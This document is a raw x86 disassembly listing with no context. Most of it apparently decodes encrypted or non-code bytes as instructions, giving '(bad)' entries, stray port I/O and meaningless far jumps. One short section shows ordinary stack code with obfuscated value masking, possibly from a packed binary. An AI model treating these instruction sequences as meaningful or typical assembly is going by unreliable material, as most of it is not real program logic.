  40290d:	lods   al,BYTE PTR ds:[esi]
  40290e:	push   cs
  40290f:	aas    
  402910:	jno    0x40291d
  402912:	cmp    bl,dl
  402914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402915:	fnstenv [esi+ebp*4+0x6c800ff]
  40291c:	fcmovnb st,st(7)
  40291e:	pushf  
  40291f:	cmp    BYTE PTR [ebx+0x36],0xbd
  402923:	and    edi,ebp
  402925:	xchg   DWORD PTR [edx-0x7f],esi
  402928:	call   0xa6ae:0x533b4836
  40292f:	sar    DWORD PTR [ebx],0x5a
  402932:	imul   ebp,DWORD PTR [ecx],0x28465812
  402938:	cwde   
  402939:	and    eax,0x11a43174
  40293e:	loopne 0x40298b
  402940:	mov    eax,0x53ec4f5c
  402945:	mov    edx,0xe0513b1e
  40294a:	mov    edi,0x2671d8a8
  40294f:	(bad)  
  402950:	sub    al,0x20
  402952:	cli    
  402953:	into   
  402954:	add    DWORD PTR [ecx-0x23],eax
  402957:	and    al,0x79
  402959:	shr    BYTE PTR [edx],1
  40295b:	ds push ss
  40295d:	rol    DWORD PTR ds:0x810643c2,1
  402963:	mov    ebp,0x13aa9785
  402968:	dec    ecx
  402969:	std    
  40296a:	arpl   WORD PTR [edx+0x3679441e],di
  402970:	xchg   ebx,eax
  402971:	call   0x836d3eaf
  402976:	iret   
  402977:	outs   dx,BYTE PTR ds:[esi]
  402978:	cdq    
  402979:	cmp    BYTE PTR [edx],ah
  40297b:	jns    0x402942
  40297d:	or     DWORD PTR [edx+0x29],0xffffff85
  402981:	js     0x4029af
  402983:	pop    esp
  402984:	shl    esi,cl
  402986:	cli    
  402987:	cmp    eax,0xe230ea6a
  40298c:	jnp    0x4029b9
  40298e:	(bad)  
  40298f:	jl     0x4029c6
  402991:	cmc    
  402992:	xor    bl,bl
  402994:	mov    ah,0x90
  402996:	xor    dh,BYTE PTR [ebx-0x6f2366b]
  40299c:	xchg   esi,eax
  40299d:	cmp    al,0x42
  40299f:	cmc    
  4029a0:	bound  bx,DWORD PTR [edx]
  4029a3:	icebp  
  4029a4:	in     al,0x29
  4029a6:	nop
  4029a7:	lods   al,BYTE PTR ds:[esi]
  4029a8:	je     0x402932
  4029aa:	pushf  
  4029ab:	rcl    DWORD PTR [esi+0x5a],0x45
  4029af:	sub    ecx,DWORD PTR ss:[ebx+0x78]
  4029b3:	loop   0x402938
  4029b5:	int    0x31
  4029b7:	(bad)  
  4029b8:	push   cs
  4029b9:	retf   
  4029ba:	enter  0x364d,0x46
  4029be:	(bad)  
  4029bf:	push   ss
  4029c0:	ret    
  4029c1:	div    BYTE PTR [edx-0x44]
  4029c4:	mov    ds:0x5bf948be,eax
  4029c9:	pop    edx
  4029ca:	jge    0x402987
  4029cc:	loop   0x402961
  4029ce:	cmc    
  4029cf:	fnstenv [ecx-0x138ab48]
  4029d5:	fistp  QWORD PTR [esi-0x1bbc5aaa]
  4029db:	xchg   ebp,eax
  4029dc:	jbe    0x402a0f
  4029de:	icebp  
  4029df:	in     eax,dx
  4029e0:	out    0x8a,al
  4029e2:	imul   ebp,ebp,0x2c
  4029e5:	sti    
  4029e6:	les    ecx,FWORD PTR [esi-0x2ef83cdf]
  4029ec:	or     dh,BYTE PTR cs:[esi-0x24]
  4029f0:	or     eax,0xdca4333a
  4029f5:	fld    TBYTE PTR [edi+0x40281c77]
  4029fb:	hlt    
  4029fc:	in     eax,dx
  4029fd:	(bad)  
  4029ff:	pusha  
  402a00:	mov    eax,DWORD PTR [ebx+0x30]
  402a03:	cmp    BYTE PTR [esi+ebp*1+0x5a],dh
  402a07:	push   cs
  402a08:	xor    al,0x83
  402a0a:	icebp  
  402a0b:	xor    BYTE PTR [ecx-0x530f7560],dl
  402a11:	test   DWORD PTR [ecx+0x3cd99b8e],eax
  402a17:	sar    edi,0x6c
  402a1a:	out    0x4c,al
  402a1c:	mov    cl,0xfb
  402a1e:	imul   ebx,DWORD PTR [edi+0x1c4f95b7],0xffffffd9
  402a25:	clc    
  402a26:	jmp    0x4029fe
  402a28:	test   BYTE PTR [ebx+0x3e],bl
  402a2b:	test   BYTE PTR [ebx+edi*8],al
  402a2e:	data16 and BYTE PTR [eax],0xe8
  402a32:	or     al,0xaa
  402a34:	test   BYTE PTR [ecx-0x1dbe60d2],bh
  402a3a:	aas    
  402a3b:	out    dx,eax
  402a3c:	or     BYTE PTR [ecx+0x481fa936],0x8f
  402a43:	std    
  402a44:	rol    BYTE PTR [edi],cl
  402a46:	out    dx,al
  402a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a48:	ficomp WORD PTR [ebx-0x78]
  402a4b:	jb     0x402a53
  402a4d:	stos   DWORD PTR es:[edi],eax
  402a4e:	data16 mov dl,BYTE PTR [edi]
  402a51:	sub    al,0x56
  402a53:	aam    0x1f
  402a55:	(bad)  
  402a56:	and    eax,0xb42542e6
  402a5b:	adc    eax,esp
  402a5d:	mov    ah,0xa2
  402a5f:	or     al,0xca
  402a61:	xor    cl,BYTE PTR [edx+eax*1+0x6a]
  402a65:	rcr    DWORD PTR [ebp-0x20],0xa9
  402a69:	fs jp  0x402a22
  402a6c:	and    al,0x50
  402a6e:	ficomp WORD PTR [edx]
  402a70:	sub    bl,BYTE PTR [edi]
  402a72:	lahf   
  402a73:	sbb    DWORD PTR [edi-0x4f49e58a],ebp
  402a79:	jbe    0x402a54
  402a7b:	pop    ecx
  402a7c:	repz jge 0x402a53
  402a7f:	push   0x13
  402a81:	mov    eax,0x34395b69
  402a86:	iret   
  402a87:	and    al,0xe
  402a89:	and    bh,bl
  402a8b:	icebp  
  402a8c:	inc    eax
  402a8d:	dec    ebx
  402a8e:	stos   BYTE PTR es:[edi],al
  402a8f:	adc    DWORD PTR [eax+ebx*2-0x10],esi
  402a93:	mov    al,ah
  402a95:	sbb    al,0xcf
  402a97:	mov    edi,0xb875af40
  402a9c:	xor    ebp,edx
  402a9e:	rol    DWORD PTR [ecx+0x79],0x62
  402aa2:	jmp    0x8061b00a
  402aa7:	pop    ds
  402aa8:	and    ecx,DWORD PTR [edi+0x2f]
  402aab:	mov    ds:0xbcd82844,eax
  402ab0:	lods   al,BYTE PTR ds:[esi]
  402ab1:	mov    bh,0xe8
  402ab3:	sbb    BYTE PTR [edi],0x28
  402ab6:	std    
  402ab7:	cmp    al,0x24
  402ab9:	in     eax,dx
  402aba:	and    esi,ecx
  402abc:	jbe    0x402aac
  402abe:	dec    esp
  402abf:	jne    0x402adb
  402ac1:	sub    bh,BYTE PTR [ebx+ecx*8+0x54c403c8]
  402ac8:	mov    al,BYTE PTR [eax+0x9aa6550]
  402ace:	dec    esp
  402acf:	mov    eax,0x389063f3
  402ad4:	and    al,0x7c
  402ad6:	pop    edx
  402ad7:	and    DWORD PTR [eax-0xb964337],0x3638ee01
  402ae1:	push   esi
  402ae2:	ficomp DWORD PTR [eax-0x1e]
  402ae5:	add    DWORD PTR [edx+0x3989dc85],edx
  402aeb:	add    DWORD PTR [eax],ebx
  402aed:	inc    ecx
  402aee:	push   ss
  402aef:	ins    BYTE PTR es:[edi],dx
  402af0:	xor    ah,BYTE PTR [eax-0x37e4543b]
  402af6:	pop    eax
  402af7:	sbb    bl,BYTE PTR [esi-0x246ec8e1]
  402afd:	jne    0x402a83
  402aff:	sub    esp,DWORD PTR [edi]
  402b01:	push   esp
  402b02:	lahf   
  402b03:	gs addr16 loope 0x402ad4
  402b07:	mov    edx,0xa094bce9
  402b0c:	out    0x3e,al
  402b0e:	aam    0x3e
  402b10:	(bad)  
  402b12:	(bad)  
  402b13:	loopne 0x402ac4
  402b15:	dec    edx
  402b16:	loopne 0x402b01
  402b18:	cdq    
  402b19:	outs   dx,DWORD PTR ds:[esi]
  402b1a:	or     dh,BYTE PTR [ecx+0x13e672f9]
  402b20:	adc    dl,BYTE PTR [ebx+0x17fe13c2]
  402b26:	(bad)  
  402b27:	sahf   
  402b28:	xchg   ebp,eax
  402b29:	gs inc eax
  402b2b:	xchg   BYTE PTR [edi+0x6b],dh
  402b2e:	mov    ds:0x239b9116,al
  402b33:	pushf  
  402b34:	mov    dh,0x2
  402b36:	pop    ebx
  402b37:	(bad)  
  402b38:	dec    esp
  402b39:	fwait
  402b3a:	in     eax,0x61
  402b3c:	out    0x94,al
  402b3e:	clc    
  402b3f:	jge    0x402b45
  402b41:	mov    ah,BYTE PTR [ebp+0x24]
  402b44:	cwde   
  402b45:	jmp    0x402b3f
  402b47:	fs out 0xf0,eax
  402b4a:	dec    eax
  402b4b:	lods   eax,DWORD PTR ds:[esi]
  402b4c:	and    DWORD PTR [edi-0x79],ebx
  402b4f:	fadd   QWORD PTR [ecx]
  402b51:	in     al,0xa4
  402b53:	iret   
  402b54:	(bad)  
  402b55:	lds    esi,FWORD PTR [esi+eax*2]
  402b58:	sub    DWORD PTR [esi-0x69],eax
  402b5b:	pop    esi
  402b5c:	nop
  402b5d:	sub    esp,DWORD PTR [ebx-0x6d272437]
  402b63:	mov    al,ds:0xae661944
  402b68:	sbb    esi,DWORD PTR [eax]
  402b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b6c:	loopne 0x402afe
  402b6e:	sub    al,ah
  402b70:	push   cs
  402b71:	jne    0x402bd7
  402b73:	pop    ss
  402b74:	bound  ebx,QWORD PTR [edi+eiz*2]
  402b77:	jecxz  0x402b2d
  402b79:	popa   
  402b7a:	in     eax,dx
  402b7b:	imul   edi,DWORD PTR gs:[ecx],0xd16c5ee9
  402b82:	popf   
  402b83:	adc    BYTE PTR [esi-0x437ce1cf],ch
  402b89:	jp     0x402bb8
  402b8b:	dec    ebp
  402b8c:	(bad)  
  402b8d:	js     0x402b75
  402b8f:	sub    bh,BYTE PTR [ecx+edx*2-0x20]
  402b93:	popf   
  402b94:	mov    ebp,0x7f8d7a8e
  402b99:	xchg   esi,eax
  402b9a:	leave  
  402b9b:	fnstcw WORD PTR [eax+0x2bbb5e56]
  402ba1:	mov    ch,0x9a
  402ba3:	(bad)
  402ba7:	stos   BYTE PTR es:[edi],al
  402ba8:	ror    BYTE PTR [esi+0xd1048b6],1
  402bae:	ror    BYTE PTR [ebx+0x5a],1
  402bb1:	mov    ebp,DWORD PTR [ecx]
  402bb3:	or     edx,ecx
  402bb5:	xchg   esi,eax
  402bb6:	std    
  402bb7:	xor    al,0x7b
  402bb9:	mov    bh,BYTE PTR [ebx]
  402bbb:	pop    ebp
  402bbc:	cli    
  402bbd:	ja     0x402bfc
  402bbf:	das    
  402bc0:	das    
  402bc1:	loop   0x402be4
  402bc3:	(bad)  
  402bc5:	push   0x1
  402bc7:	jecxz  0x402bdd
  402bc9:	sub    BYTE PTR [ebx+0x6638c897],al
  402bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bd0:	inc    ebp
  402bd1:	aad    0xdb
  402bd3:	adc    BYTE PTR [esp+edx*8-0x1d],al
  402bd7:	fwait
  402bd8:	pushf  
  402bd9:	mov    BYTE PTR gs:[edx-0x714b03da],bl
  402be0:	add    al,0x79
  402be2:	pop    esi
  402be3:	sbb    ebx,edx
  402be5:	jg     0x402b89
  402be7:	dec    edx
  402be8:	jne    0x402bb4
  402bea:	jp     0x402bed
  402bec:	add    eax,0x1c4c275e
  402bf1:	sub    edi,DWORD PTR [ebx]
  402bf3:	dec    esp
  402bf4:	push   ss
  402bf5:	lods   eax,DWORD PTR ds:[esi]
  402bf6:	add    al,0xd7
  402bf8:	nop
  402bf9:	les    eax,FWORD PTR [ebx+eax*2]
  402bfc:	fisubr WORD PTR [eax-0x57]
  402bff:	(bad)  
  402c00:	mov    WORD PTR [eax-0x73db1370],ds
  402c06:	jb     0x402c82
  402c08:	push   0x55
  402c0a:	fsub   st,st(5)
  402c0c:	adc    bh,BYTE PTR [esi-0x57af183f]
  402c12:	xor    bl,cl
  402c14:	ins    BYTE PTR es:[edi],dx
  402c15:	std    
  402c16:	dec    eax
  402c17:	xchg   ecx,eax
  402c18:	sub    al,0xf3
  402c1a:	leave  
  402c1b:	bound  esp,QWORD PTR [eax-0x67]
  402c1e:	into   
  402c1f:	stc    
  402c20:	push   cs
  402c21:	out    dx,al
  402c22:	inc    edx
  402c23:	loopne 0x402bc5
  402c25:	loopne 0x402c04
  402c27:	fs add eax,0x6c5104fb
  402c2d:	pop    ss
  402c2e:	and    al,0x3b
  402c30:	mov    cl,0xf1
  402c32:	xchg   ecx,eax
  402c33:	sub    esi,DWORD PTR [edx]
  402c35:	(bad)  
  402c37:	cmp    DWORD PTR [ebp-0x49],ebp
  402c3a:	mov    ah,0x44
  402c3c:	retf   
  402c3d:	mov    WORD PTR [edx-0x4b2bf2fc],es
  402c43:	xor    DWORD PTR [esi],esp
  402c45:	xchg   edi,eax
  402c46:	aam    0x8d
  402c48:	mov    edx,0xb31305f1
  402c4d:	jmp    0x4d21b07f
  402c52:	mov    ds:0xb2aff78e,eax
  402c57:	sub    ebx,edi
  402c59:	jne    0x402c63
  402c5b:	inc    ebp
  402c5c:	dec    esi
  402c5d:	cmp    ebp,DWORD PTR [ecx+eiz*1-0x6e662ffd]
  402c64:	xor    eax,0x91fb46d3
  402c69:	push   edx
  402c6a:	aad    0x49
  402c6c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c6e:	mov    ah,bh
  402c70:	loope  0x402c28
  402c72:	lock std 
  402c74:	imul   edx,DWORD PTR [edx+0x49],0xd
  402c78:	arpl   WORD PTR [esi+ecx*2+0x19],bp
  402c7c:	out    dx,eax
  402c7d:	and    DWORD PTR ds:0x6a24f189,ebp
  402c83:	push   edi
  402c84:	sahf   
  402c85:	pop    ds
  402c86:	pop    es
  402c87:	in     al,dx
  402c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c89:	xchg   DWORD PTR [edx+0xc],ebp
  402c8c:	jmp    0x402cf9
  402c8e:	jnp    0x402cf3
  402c90:	push   ebp
  402c91:	pushf  
  402c92:	aas    
  402c93:	push   0xffffff85
  402c95:	cmp    DWORD PTR [edx],ebx
  402c97:	call   0x8e63579e
  402c9c:	mov    DWORD PTR [edx+0x55],edi
  402c9f:	mov    bl,0x7
  402ca1:	call   0x3aafff52
  402ca6:	pop    ebp
  402ca7:	xchg   ebp,eax
  402ca8:	out    0x4d,eax
  402caa:	arpl   WORD PTR [eax],di
  402cac:	xor    ch,BYTE PTR [eax+0x42cd0cbb]
  402cb2:	shl    BYTE PTR [eax],cl
  402cb4:	or     al,0x2d
  402cb6:	xchg   ecx,eax
  402cb7:	ret    0xab96
  402cba:	aas    
  402cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cbc:	outs   dx,BYTE PTR ds:[esi]
  402cbd:	sub    al,0x5c
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	ficom  WORD PTR fs:[ebp+0x77]
  402d41:	loopne 0x402cdb
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402ccd
  402d4b:	daa    
  402d4c:	jmp    0x402da4
  402d4e:	stc    
  402d4f:	std    
  402d50:	jl     0x402d0e
  402d52:	aaa    
  402d53:	dec    eax
  402d54:	and    bl,BYTE PTR [eax]
  402d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d57:	mov    BYTE PTR [edx],bl
  402d59:	test   DWORD PTR [edx-0x35],edi
  402d5c:	mov    bl,0xf9
  402d5e:	dec    ecx
  402d5f:	clc    
  402d60:	adc    ecx,edx
  402d62:	lea    eax,[ecx-0x75556b2d]
  402d68:	aad    0xc6
  402d6a:	ret    
  402d6b:	mov    esi,0xf6c6730c
  402d70:	push   ds
  402d71:	xchg   edi,eax
  402d72:	ds hlt 
  402d74:	xchg   esp,eax
  402d75:	ror    BYTE PTR [ebx],0x72
  402d78:	xor    eax,0x118b7fe2
  402d7d:	dec    esp
  402d7e:	loope  0x402dcf
  402d80:	push   ss
  402d81:	xchg   BYTE PTR [edx+0x50b845c8],ah
  402d87:	jmp    0x4ee51976
  402d8c:	mov    ch,BYTE PTR [ebp+ecx*1-0x3a99632d]
  402d93:	lea    ecx,ds:0x50bf1ee0
  402d99:	fist   WORD PTR ds:0x9def5b11
  402d9f:	aaa    
  402da0:	das    
  402da1:	imul   esp,DWORD PTR [ecx+0x9],0x2a
  402da5:	lds    edx,FWORD PTR [esi-0x48]
  402da8:	stc    
  402da9:	xor    dh,BYTE PTR [edx]
  402dab:	push   es
  402dac:	sbb    DWORD PTR [esi+edi*1],edi
  402daf:	jb     0x402d5b
  402db1:	(bad)  
  402db2:	cmp    DWORD PTR [edi-0x5285467f],ecx
  402db8:	mov    esi,esp
  402dba:	test   DWORD PTR [eax+esi*1-0x486cee70],0xae1bfe21
  402dc5:	dec    edx
  402dc6:	cmp    ebx,DWORD PTR [ecx]
  402dc8:	inc    esp
  402dc9:	ins    DWORD PTR es:[edi],dx
  402dca:	sbb    eax,0x4ad46e6a
  402dcf:	stos   BYTE PTR es:[edi],al
  402dd0:	sub    BYTE PTR ds:0xebaf8f31,0x99
  402dd7:	push   0x4a017ee0
  402ddc:	jl     0x402ddd
  402dde:	xor    DWORD PTR [esi-0x10],eax
  402de1:	pop    esp
  402de2:	dec    edi
  402de3:	inc    DWORD PTR [ebx]
  402de5:	aas    
  402de6:	sub    DWORD PTR [ebx],edi
  402de8:	nop
  402de9:	push   cs
  402dea:	pop    esi
  402deb:	rol    ah,cl
  402ded:	xor    WORD PTR [eax+0x4407860e],bp
  402df4:	fisubr DWORD PTR [eax+0x35b00206]
  402dfa:	jle    0x402e09
  402dfc:	inc    ebx
  402dfd:	push   ebx
  402dfe:	call   FWORD PTR [ebp+0x40]
  402e01:	aas    
  402e02:	xchg   ecx,eax
  402e03:	add    DWORD PTR [edi+eiz*2],ebp
  402e06:	pop    ebx
  402e07:	jmp    0x523a0946
  402e0c:	push   ebp
  402e0d:	xchg   ebx,eax
  402e0e:	mov    ah,0x8d
  402e10:	add    al,0xdd
  402e12:	and    BYTE PTR [edx-0x45b8a836],bh
  402e18:	cmp    BYTE PTR [edi+0x4de2b041],0xd9
  402e1f:	scas   al,BYTE PTR es:[edi]
  402e20:	call   0x97a0:0x706f2db8
  402e27:	lock fcom DWORD PTR [edx]
  402e2a:	in     al,dx
  402e2b:	pop    edx
  402e2c:	dec    ebp
  402e2d:	cld    
  402e2e:	push   cs
  402e2f:	cmp    eax,0xeb169b0a
  402e34:	or     DWORD PTR [ecx+edi*8-0x5b554c1],ebx
  402e3b:	sbb    al,0xfc
  402e3d:	sub    eax,0xe82aff1e
  402e42:	cmp    al,0x1c
  402e44:	bound  ebx,QWORD PTR [ecx-0x33fb2e3b]
  402e4a:	int3   
  402e4b:	push   ebp
  402e4c:	inc    esi
  402e4d:	xchg   edi,eax
  402e4e:	inc    edi
  402e4f:	sub    eax,0x5f58cf93
  402e54:	mov    bl,dh
  402e56:	inc    ebp
  402e57:	add    al,0xe3
  402e59:	data16 stos BYTE PTR es:[edi],al
  402e5b:	fild   DWORD PTR cs:[esi]
  402e5e:	test   BYTE PTR [edx],cl
  402e60:	mov    ah,0x7f
  402e62:	or     DWORD PTR [ebp-0x74],ebx
  402e65:	clc    
  402e66:	repz mov bh,0x0
  402e69:	pop    ss
  402e6a:	cmp    ebx,DWORD PTR [ecx]
  402e6c:	mov    ecx,0x15529e9e
  402e71:	sbb    edx,0x3f
  402e74:	hlt    
  402e75:	mov    edx,0xf7233b2d
  402e7a:	xor    ah,BYTE PTR [ecx+0x4ea08b62]
  402e80:	or     BYTE PTR [ecx+eax*8+0x3c],dh
  402e84:	out    0x81,eax
  402e86:	scas   eax,DWORD PTR es:[edi]
  402e87:	out    dx,al
  402e88:	and    BYTE PTR [edx+esi*1],ah
  402e8b:	es jecxz 0x402eef
  402e8e:	out    0xf8,al
  402e90:	sar    ah,0x32
  402e93:	xchg   ebx,ebx
  402e95:	mov    eax,0x645c7341
  402e9a:	jae    0x402eeb
  402e9c:	mov    ah,0x22
  402e9e:	push   esp
  402e9f:	ss jp  0x402eac
  402ea2:	add    dh,ch
  402ea4:	loopne 0x402ee8
  402ea6:	jge    0x402e71
  402ea8:	mov    ds:0xf4266644,al
  402ead:	jno    0x402e77
  402eaf:	xchg   ebx,eax
  402eb0:	push   eax
  402eb1:	and    al,0xd5
  402eb3:	std    
  402eb4:	inc    edi
  402eb5:	cmp    ebx,esp
  402eb7:	in     eax,0x2d
  402eb9:	out    dx,eax
  402eba:	sahf   
  402ebb:	jbe    0x402ebf
  402ebd:	xor    DWORD PTR [edi+0x5fe7f22f],0x36
  402ec4:	stc    
  402ec5:	shr    DWORD PTR [ebp+0x4b049985],1
  402ecb:	(bad)  
  402ecc:	pop    es
  402ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ece:	jb     0x402f4a
  402ed0:	out    dx,al
  402ed1:	dec    edx
  402ed2:	inc    edx
  402ed3:	pop    ebp
  402ed4:	enter  0xcb70,0xac
  402ed8:	pusha  
  402ed9:	or     DWORD PTR [ebp+0x2d],0x422477e4
  402ee0:	sub    eax,0x3ec6ca50
  402ee5:	jbe    0x402ed5
  402ee7:	and    edx,DWORD PTR [ebp+0x7e]
  402eea:	xor    al,0xc0
  402eec:	sub    BYTE PTR [eax-0x68],dl
  402eef:	mov    eax,ds:0xd3e3ecce
  402ef4:	pushf  
  402ef5:	sbb    BYTE PTR fs:[esi+0x7c713d0c],0x10
  402efd:	adc    edx,0x74
  402f00:	jae    0x402f3e
  402f02:	addr16 fs push edx
  402f05:	neg    DWORD PTR [ecx+0xfed5794]
  402f0b:	jp     0x402f65
  402f0d:	jne    0x402e9e
  402f0f:	and    eax,0x7b34ede9
  402f14:	rol    DWORD PTR [edx],cl
  402f16:	ins    BYTE PTR es:[edi],dx
  402f17:	ss sbb esi,esi
  402f1a:	pop    es
  402f1b:	finit  
  402f1e:	inc    edx
  402f1f:	mov    ah,0x23
  402f21:	inc    ebx
  402f22:	jmp    0x9572:0xf8cf152a
  402f29:	sbb    ebx,DWORD PTR [ecx+ebp*4+0x40]
  402f2d:	in     al,dx
  402f2e:	jmp    0xd3a5:0x18ad112a
  402f35:	pop    DWORD PTR [eax+ecx*2-0x1040c0d5]
  402f3c:	fs ret 
  402f3e:	idiv   edx
  402f40:	(bad)  
  402f41:	clc    
  402f42:	in     al,0x38
  402f44:	jge    0x402f8a
  402f46:	fstp   DWORD PTR [esi]
  402f48:	popa   
  402f49:	fs ror esi,cl
  402f4c:	icebp  
  402f4d:	push   0xd3da5ce5
  402f52:	not    DWORD PTR [edi-0x52]
  402f55:	adc    ch,BYTE PTR [eax+ebx*1]
  402f58:	fdiv   st(1),st
  402f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f5b:	mov    ebx,0x20cded9b
  402f60:	fsubp  st(0),st
  402f62:	clc    
  402f63:	dec    edx
  402f64:	mov    BYTE PTR [ecx-0x6b],0xc6
  402f68:	sub    dh,BYTE PTR [edx]
  402f6a:	iret   
  402f6b:	jno    0x402f22
  402f6d:	fbld   TBYTE PTR [edx+0x2b767868]
  402f73:	in     eax,0xa0
  402f75:	push   es
  402f76:	adc    ecx,DWORD PTR cs:[edx+0x56004d3e]
  402f7d:	stos   BYTE PTR es:[edi],al
  402f7e:	push   ss
  402f7f:	pop    ss
  402f80:	cmp    BYTE PTR [edx-0x11bb999b],0xe3
  402f87:	sbb    eax,0x309e93af
  402f8c:	cmc    
  402f8d:	mov    ah,0x83
  402f8f:	call   0x8ced:0x666a9210
  402f96:	test   DWORD PTR [eax+0x3c],ebx
  402f99:	add    al,0xef
  402f9b:	xor    edi,edx
  402f9d:	repnz dec edi
  402f9f:	mov    ecx,0xedec093e
  402fa4:	inc    ebp
  402fa5:	jmp    0xe6ab:0xa88f99da
  402fac:	fldcw  WORD PTR [esp+edi*8]
  402faf:	shr    DWORD PTR [bx+si],1
  402fb2:	mov    esp,DWORD PTR [eax]
  402fb4:	mov    gs,WORD PTR [ebx]
  402fb6:	push   esp
  402fb7:	out    dx,al
  402fb8:	jb     0x402f6a
  402fba:	push   ecx
  402fbb:	test   DWORD PTR [eax+0x9543e3b],esp
  402fc1:	iret   
  402fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc3:	fiadd  DWORD PTR [edx+0x25]
  402fc6:	repnz cmp edi,esi
  402fc9:	out    0x48,al
  402fcb:	and    ebp,DWORD PTR [ebx]
  402fcd:	ret    0xd331
  402fd0:	xchg   esp,eax
  402fd1:	xor    ecx,eax
  402fd3:	lea    ebp,[ebp*1+0x5a5826a3]
  402fda:	or     dl,BYTE PTR [eax-0x28b077b8]
  402fe0:	xor    ebx,DWORD PTR [esi]
  402fe2:	sbb    al,0x20
  402fe4:	xchg   esp,eax
  402fe5:	inc    esi
  402fe6:	mov    bl,0xb3
  402fe8:	push   cs
  402fe9:	in     eax,0x7
  402feb:	inc    esi
  402fec:	sbb    bl,BYTE PTR [edi-0x11]
  402fef:	fimul  WORD PTR ds:0x7b8cfe89
  402ff5:	stos   DWORD PTR es:[edi],eax
  402ff6:	outs   dx,BYTE PTR ds:[esi]
  402ff7:	sub    DWORD PTR [ecx+0x59],eax
  402ffa:	or     al,0xe6
  402ffc:	js     0x402fa4
  402ffe:	(bad)  
  402fff:	pop    esi
  403000:	les    ebp,FWORD PTR [esi]
  403002:	pusha  
  403003:	arpl   WORD PTR ds:0x5133b6c,cx
  403009:	pop    esp
  40300a:	lea    edi,[ebx-0x20e60a51]
  403010:	push   es
  403011:	cmp    al,0xc1
  403013:	scas   eax,DWORD PTR es:[edi]
  403014:	xor    BYTE PTR [ecx-0x69026636],bl
  40301a:	add    DWORD PTR [edi+0x13577f6],esi
  403020:	push   edx
  403021:	inc    ebp
  403022:	sar    al,0x7c
  403025:	shr    edx,1
  403027:	add    esi,esp
  403029:	in     eax,dx
  40302a:	je     0x402fd4
  40302c:	push   edi
  40302d:	into   
  40302e:	pop    ds
  40302f:	ret    0x4786
  403032:	jmp    0x402ffe
  403034:	pop    ebp
  403035:	scas   eax,DWORD PTR es:[edi]
  403036:	gs clc 
  403038:	add    BYTE PTR [ecx-0x7b],0xfa
  40303c:	sbb    DWORD PTR [edi-0x47fade8a],esi
  403042:	repz mov esi,0xa986e44f
  403048:	es (bad) 
  40304a:	(bad)  
  40304c:	or     eax,0x68d7a403
  403051:	leave  
  403052:	sbb    eax,esi
  403054:	ret    0xf50c
  403057:	push   esi
  403058:	mov    bl,BYTE PTR [eax]
  40305a:	pushf  
  40305b:	arpl   WORD PTR [ebp-0x652cd73c],sp
  403061:	or     ch,al
  403063:	mov    esi,0xde74e068
  403068:	dec    ecx
  403069:	in     al,dx
  40306a:	jg     0x403041
  40306c:	pop    esi
  40306d:	xor    eax,0x97db3c41
  403072:	ja     0x4030a4
  403074:	inc    esi
  403075:	mov    ah,0xa0
  403077:	adc    al,0x5f
  403079:	popa   
  40307a:	mov    eax,0xadbaee37
  403080:	les    ebp,FWORD PTR [ebx]
  403082:	jnp    0x40308c
  403084:	ds inc esi
  403086:	int    0xdb
  403088:	mov    eax,0x71a4615a
  40308d:	xchg   ebx,eax
  40308e:	mov    dl,0x9a
  403090:	push   ebx
  403091:	cdq    
  403092:	jbe    0x4030e9
  403094:	in     eax,0x4c
  403096:	(bad)  
  403097:	loopne 0x4030f8
  403099:	sbb    al,0x89
  40309b:	xchg   ebp,eax
  40309c:	rcr    DWORD PTR [ecx],1
  40309e:	jnp    0x403043
  4030a0:	adc    bl,dh
  4030a2:	mov    ah,0x39
  4030a4:	inc    eax
  4030a5:	jnp    0x40309a
  4030a7:	(bad)  
  4030a8:	(bad)  [ebx+0x406ddec1]
  4030ae:	inc    eax
  4030af:	xchg   ebp,eax
  4030b0:	jmp    0x403122
  4030b2:	ins    DWORD PTR es:[edi],dx
  4030b3:	int3   
